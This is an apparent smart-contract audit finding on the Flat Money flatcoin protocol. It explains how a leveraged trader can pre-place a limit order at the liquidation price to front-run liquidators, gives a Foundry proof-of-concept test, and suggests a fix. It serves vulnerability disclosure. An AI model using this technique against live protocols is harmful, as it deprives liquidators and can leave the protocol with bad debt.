Exotic Goldenrod Duck

high

# Leverage trader can front-run liquidation to close position by placing limit order in advance

## Summary
Leverage trader can front-run liquidation to close position by placing limit order in advance.

## Vulnerability Detail
When a leverage position is opened by a leverage trader, this position can be liquidated if the collateral price drops to liquidation price.

Liquidator calls [liquidate(...)](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LiquidationModule.sol#L85) function to liquidate, this function can be executed without any delay.

At the same time, a leverage position can also be [closed](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LeverageModule.sol#L255-L259) by the trader even if the collateral price is below the liquidation price. 

To close a position, leverage trader should first create a close order by [making a announcement](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/DelayedOrder.sol#L317), only if the minimum time delay is reached the order can be executed.

With such limitation, it's unlikely leverage trader can close a liquidatable position before it's liquidated by a liquidator. However, this is not always true, the trader can actually front-run liquidation to close position by placing limit order in advance.

A limit order can only be [executed](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LimitOrder.sol#L134) if the collateral price is below **priceUpperThreshold** or the price is above **priceUpperThreshold**:
```solidity
        if (price <= _limitOrder.priceLowerThreshold) {
            minFillPrice = 0; // can execute below lower limit price threshold
        } else if (price >= _limitOrder.priceUpperThreshold) {
            minFillPrice = _limitOrder.priceUpperThreshold;
        } else {
            revert FlatcoinErrors.LimitOrderPriceNotInRange(
                price,
                _limitOrder.priceLowerThreshold,
                _limitOrder.priceUpperThreshold
            );
        }
```
So a leverage trader can create a limit order right after opening a position, and set **priceLowerThreshold** to `liquidation price` and 
**priceUpperThreshold** to `type(uint256).max`, thus the position can only be closed when the collateral price is no larger than `liquidation price`. If collateral price drops to `liquidation price`, the trader can front-run any liquidator to execute the limit order to close the position, as a result, the trader "rescues" some funds whereas liquidator gets nothing but a reverted transaction. 

Please see the test codes:
```solidity
    function test_audit_frontrun_liquidation_and_close_position() public {
        uint256 oraclePrice = 1000e8;

        announceAndExecuteDeposit({
            traderAccount: alice, 
            keeperAccount: keeper, 
            depositAmount: 100e18, 
            oraclePrice: oraclePrice, 
            keeperFeeAmount: 0
        });

        // Bob opens a position
        uint256 tokenId = announceAndExecuteLeverageOpen({
            traderAccount: bob,
            keeperAccount: keeper,
            margin: 50e18,
            additionalSize: 100e18,
            oraclePrice: oraclePrice,
            keeperFeeAmount: 0
        });

        // Bob place a limit order, priceLowerThreshold is liqPrice and priceUpperThreshold is type(uint256).max
        vm.startPrank(bob);
        uint256 liqPrice = liquidationModProxy.liquidationPrice(tokenId);
        limitOrderProxy.announceLimitOrder({
            tokenId: tokenId,
            priceLowerThreshold: liqPrice,
            priceUpperThreshold: type(uint256).max
        });
        vm.stopPrank();

        skip(uint256(vaultProxy.minExecutabilityAge()));

        // Keeper cannot execute the limit order because price is not in range
        vm.startPrank(keeper);
        bytes[] memory priceUpdateData = getPriceUpdateData(oraclePrice);
        vm.expectRevert(abi.encodeWithSelector(FlatcoinErrors.LimitOrderPriceNotInRange.selector, 1000e18, liqPrice, type(uint256).max));
        limitOrderProxy.executeLimitOrder{value: 1}(tokenId, priceUpdateData);
        vm.stopPrank();

        uint256 bobCollateralBalanceAfterOpenningPosition = WETH.balanceOf(bob);

        // Price drops
        skip(2 days);
        uint256 liquidationPrice = (liqPrice - 1e18) / 1e10;
        setWethPrice(liquidationPrice);

        // Bob's position can be liquidated
        assertTrue(liquidationModProxy.canLiquidate(tokenId));

        // Bob frontruns and closes his position
        vm.startPrank(bob);
        priceUpdateData = getPriceUpdateData(oraclePrice);
        limitOrderProxy.executeLimitOrder{value: 1}(tokenId, priceUpdateData);
        vm.stopPrank();

        uint256 bobCollateralBalanceAfterClosingPosition = WETH.balanceOf(bob);

        // Bob get some collateral back
        assertTrue(bobCollateralBalanceAfterClosingPosition - bobCollateralBalanceAfterOpenningPosition > 0);

        skip(1);

        // Liquidator cannot liquidate because postion has been closed
        vm.startPrank(liquidator);
        priceUpdateData = getPriceUpdateData(oraclePrice);
        vm.expectRevert(abi.encodeWithSelector(FlatcoinErrors.CannotLiquidate.selector, tokenId));
        liquidationModProxy.liquidate{value: 1}(tokenId, priceUpdateData);
        vm.stopPrank();
    }
```

## Impact
Leverage trader cannot be liquidated.

## Code Snippet
https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LeverageModule.sol#L255-L259

## Tool used
Manual Review

## Recommendation
Should not allow leverage trader to close a position if the collateral price drops to liquidation price.
```diff
    function executeClose(
        address _account,
        address _keeper,
        FlatcoinStructs.Order calldata _order
    ) external whenNotPaused onlyAuthorizedModule returns (int256 settledMargin) {
        ...

+       if (
+           ILiquidationModule(vault.moduleAddress(FlatcoinModuleKeys._LIQUIDATION_MODULE_KEY)).canLiquidate(
+               announcedClose.tokenId
+           )
+       ) revert FlatcoinErrors.PositionCreatesBadDebt();

        ...
    }
``` 